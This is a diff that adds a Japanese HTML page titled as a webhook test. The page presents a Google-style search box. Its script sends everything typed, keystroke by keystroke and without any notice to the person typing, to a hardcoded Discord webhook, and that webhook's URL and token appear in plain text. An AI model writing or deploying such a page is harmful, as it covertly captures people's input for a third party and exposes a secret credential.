@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook通知テスト</title>
+</head>
+<body>
+
+<form id="cse-search-box" action="https://www.google.com/search">
+    <label for="textBox">テキストボックス:</label>
+    <input type="search" id="textBox" name="textBox">
+</form>
+
+<form method="get" action="http://www.google.co.jp/search" id="googleForm">
+    <table bgcolor="#FFFFFF"><tr><td>
+        <a href="http://www.google.co.jp/">
+            <img src="http://www.google.com/logos/Logo_40wht.gif" border="0" alt="Google" align="absmiddle">
+        </a>
+        <input type="hidden" name="q" id="googleInput" size="31" maxlength="255" value="">
+        <input type="hidden" name="ie" value="UTF-8">
+        <input type="hidden" name="oe" value="UTF-8">
+        <input type="hidden" name="hl" value="ja">
+        <input type="submit" name="btnG" value="Google 検索">
+    </td></tr></table>
+</form>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+    const textBox = document.getElementById('textBox');
+    const googleInput = document.getElementById('googleInput');
+    const googleForm = document.getElementById('googleForm');
+
+    textBox.addEventListener('input', () => {
+        const text = textBox.value;
+        googleInput.value = text;
+        sendWebhookNotification(text);
+    });
+
+    textBox.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            googleForm.submit();
+        }
+    });
+});
+
+function sendWebhookNotification(text) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1251487084951244871/gL7Y1S3RagPJPoSusvPF6CeYdxvc17e81J2algmpZfESlFQTWJ72V8FFSltRW8K1nXVT';
+    const deviceName = 'Chromebook'; // デバイス名を設定
+
+    const message = {
+        content: `メモ:${deviceName} 内容:${text}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+</script>
+
+</body>
+</html>
+
